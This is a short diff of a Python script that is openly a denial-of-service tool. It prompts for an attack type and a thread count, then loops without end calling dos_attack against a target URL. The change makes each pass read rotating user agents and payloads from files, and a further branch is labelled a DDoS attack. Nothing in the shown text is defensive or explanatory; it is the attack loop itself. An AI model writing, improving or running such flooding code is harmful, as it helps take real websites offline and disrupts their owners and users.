@@ -105,8 +105,12 @@ if __name__ == "__main__":
             if attack_type == "1":
                 num_threads = int(input("Enter number of threads for DoS attack: "))
                 while True:
-                    user_agent = random.choice(user_agents)
-                    dos_attack(target_url, user_agent, random.choice(payloads))
+                    with open(user_agents_file, 'r') as file:
+                        user_agents = file.readlines()
+                        user_agent = random.choice([agent.strip() for agent in user_agents])
+                    with open(payloads_file, 'r') as file:
+                        payloads = file.readlines()
+                        dos_attack(target_url, user_agent, random.choice([payload.strip() for payload in payloads]))
             
             elif attack_type == "2":
                 num_threads = int(input("Enter number of threads for DDoS attack: "))
